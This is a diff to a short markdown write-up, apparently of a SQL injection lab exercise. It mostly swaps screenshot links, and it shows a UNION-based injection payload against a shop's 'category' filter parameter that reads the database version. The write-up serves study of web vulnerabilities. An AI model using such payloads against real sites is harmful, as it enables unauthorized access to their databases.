@@ -14,7 +14,7 @@ Reference:
 
 Filtering using GET parameter “category”: "/filter?category=Accesories"
 
-<img width="1920" height="1022" alt="1" src="https://github.com/user-attachments/assets/d13e7a6b-456a-4a64-9920-7685411630c7" />
+<img width="1283" height="863" alt="1" src="https://github.com/user-attachments/assets/3bac46cf-d13d-4cd4-bb21-6f9e8f2e3bb2" />
 
 
 /filter?category=Accesories -> Return 4 items
@@ -28,7 +28,8 @@ Filtering using GET parameter “category”: "/filter?category=Accesories"
 /filter?category=Accessories'+union+select+0,@@version#
 
 ```
-GET /filter?category=Accessories'+union+select+0,@@version#
+/filter?category=Accessories'+union+select+0,@@version#
 ``` 
 
-<img width="1920" height="1022" alt="2" src="https://github.com/user-attachments/assets/6401bd8c-21e1-4569-807b-ee154fee46e9" />
+<img width="1534" height="832" alt="2" src="https://github.com/user-attachments/assets/706a6b72-4a5a-4647-924c-2db77e8dfc17" />
+
